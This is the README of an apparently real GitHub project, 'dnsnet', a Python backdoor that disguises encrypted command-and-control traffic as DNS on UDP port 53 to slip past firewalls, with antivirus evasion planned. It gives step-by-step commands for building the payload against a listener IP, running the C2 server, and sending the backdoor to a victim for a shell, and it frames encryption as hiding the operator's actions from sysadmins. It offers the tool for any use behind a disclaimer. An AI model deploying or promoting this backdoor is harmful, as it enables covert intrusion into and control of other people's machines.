# dnsnet


# Current Version: BetaV1

# Logo:
![box](https://user-images.githubusercontent.com/72181445/155982020-2db1333f-74b7-4c3f-8178-f14a75a0a65d.png)

# Description:
DNSNET Is a backdoor that uses encrypted "dns" to communicate with the command & control server.


DNSNET Uses udp port 53 to make itself look like dns traffic, this means that firewalls can't block this port (without losing dns rsolving) and i will be adding av evasion.

# "But why encrypted?" Answer:
If someone notices your actions, the sysadmin or whatever can't see what you were trying to do so your opsec will not be compromised

<img src=https://user-images.githubusercontent.com/72181445/155986263-d911e874-5ce2-4d99-a5d3-0c44ae65f9bc.png width=500 heigth=500></img>

# Disclaimer:
Im not responsible for any damage or harm done by this program in the hands of other entities

# Where is this used?:
I originally started coding this because i wanted a sure way to stealth backdoor victim machine during a red team assesments however

you can use it however you want (Im not responsible for your own actions).

# Update log:
Alpha: 10 times encryption and stabile server end

AlphaV2: Automatic reconnect if connection is lost and manual reset added by pressing ctrl + c on the server end, cryptography import problems solved

BetaV1: Backdoor now remembers where you cd'ed to allowing much better file sytem exploring, overall small fixes to make the backdoor more stable and usable

# In dev?: YES, This is the only project im working on currently

# How to use (REPLACE "Listener ip" with the c2 ip):
git clone https://github.com/R00tendo/dnsnet

cd dnsnet

apt install unrar

unrar e cryptography.rar

pip3 install termcolor

python3 key_generator.py 5 > keys

python3 virus_generator.py <Listener ip>

python3 server.py

and send the backdoor directory and get your shell (if on windows i suggest using pyinstaller to compile it to exe first)
 
# Technical Details:
Encryption: Fernet 32bit encryption (that times the keys)
Program: Python3
  

